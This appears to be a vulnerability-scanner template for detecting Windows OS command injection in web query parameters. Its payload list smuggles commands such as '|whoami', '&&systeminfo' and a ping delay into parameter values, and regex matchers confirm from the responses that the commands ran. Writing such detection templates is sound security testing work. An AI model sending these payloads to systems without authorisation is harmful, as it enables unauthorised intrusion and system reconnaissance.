id: windows-command-injection

info:
  name: Windows 命令注入 - 通用检测（DAST）
  author: Jaenact
  severity: high
  description: |-
    通过使用命令分隔符载荷替换查询参数值，检测到 Windows 目标上潜在的操作系统命令注入，并通过 `dir`、`whoami`、`systeminfo` 等命令的输出模式，或通过 `ping` 引发的响应时间延迟来确认命令执行成功。
  impact: |-
    成功利用可在底层 Windows 系统上执行任意命令，导致服务器完全沦陷、数据窃取、权限提升以及拒绝服务。
  remediation: |-
    切勿将用户可控输入直接传递给 cmd.exe 或 PowerShell。应使用参数化 API 或语言原生函数，而非 system()/exec()。对输入实施严格的白名单校验，并为应用程序进程强制采用最小权限执行上下文。
  reference:
    - https://owasp.org/www-community/attacks/Command_Injection
    - https://cwe.mitre.org/data/definitions/78.html
    - https://capec.mitre.org/data/definitions/88.html
    - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
  metadata:
    verified: true
    max-request: 14
  tags: cmdi,dast,rce,windows,fuzz,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        # dir output
        - "|dir"
        - "&dir"
        - "&&dir"
        - "||dir"
        - "|dir C:\\"
        - "&&dir C:\\"
        # identity
        - "|whoami"
        - "&&whoami"
        # system enumeration
        - "|systeminfo"
        - "&&systeminfo"
        - "|ipconfig"
        - "&&ipconfig"
        # time-based
        - "&ping -n 5 127.0.0.1&"
        - "&&ping -n 5 127.0.0.1&&"

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: regex
        name: dir-output
        part: body
        regex:
          - '(?mi)Directory of [A-Z]:\\\\'
          - '(?mi)Volume in drive [A-Z]'

      - type: regex
        name: systeminfo-output
        part: body
        regex:
          - '(?mi)^OS Name:\s+'
          - '(?mi)^Host Name:\s+'

      - type: regex
        name: ipconfig-output
        part: body
        regex:
          - '(?mi)Windows IP Configuration'

      - type: regex
        name: whoami-output
        part: body
        regex:
          - '(?mi)^[a-z][-a-z0-9]*\\\\[a-z][-a-z0-9]*$'

      - type: dsl
        name: time-based
        dsl:
          - 'duration >= 4'
